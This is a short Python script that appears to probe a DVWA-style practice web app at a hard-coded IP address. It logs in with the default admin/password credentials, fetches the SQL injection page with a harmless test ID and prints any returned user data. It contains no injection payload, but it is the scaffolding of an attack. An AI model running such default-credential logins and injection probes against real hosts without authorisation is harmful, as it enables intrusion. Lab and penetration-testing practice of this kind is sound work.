
import requests
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

url_base = "http://31.97.117.123"
session = requests.Session()

# Login
login_url = f"{url_base}/login.php"
response = session.get(login_url, verify=False)
token_match = re.search(r"name='user_token'\s+value='([^']+)'", response.text)
user_token = token_match.group(1)

payload = {
    "username": "admin",
    "password": "password",
    "user_token": user_token,
    "Login": "Login"
}

response = session.post(login_url, data=payload, verify=False, allow_redirects=True)
print("[+] Logged in successfully\n")

# Test SQL injection with a simple ID
sqli_url = f"{url_base}/vulnerabilities/sqli/"
test_payload = "1"
response = session.get(sqli_url, params={"id": test_payload, "Submit": "Submit"}, verify=False)

print("[*] Testing basic SQL injection...")
print(f"[*] Response length: {len(response.text)}")

# Save the response
with open("/tmp/sqli_test.html", "w") as f:
    f.write(response.text)

# Look for database results
if "First name" in response.text or "Surname" in response.text or "last name" in response.text.lower():
    print("[+] Found user data in response!")
    # Extract the relevant section
    start = response.text.find("First name")
    if start == -1:
        start = response.text.find("first name")
    if start == -1:
        start = response.text.find("<table")
    
    print("\nRelevant section:")
    print(response.text[max(0, start-200):min(len(response.text), start+1000)])
else:
    print("[-] No user data found in basic query")
    
# Show all text content around form results
if "id" in response.text.lower():
    print("\n[*] Full response preview:")
    print(response.text[3000:5000])

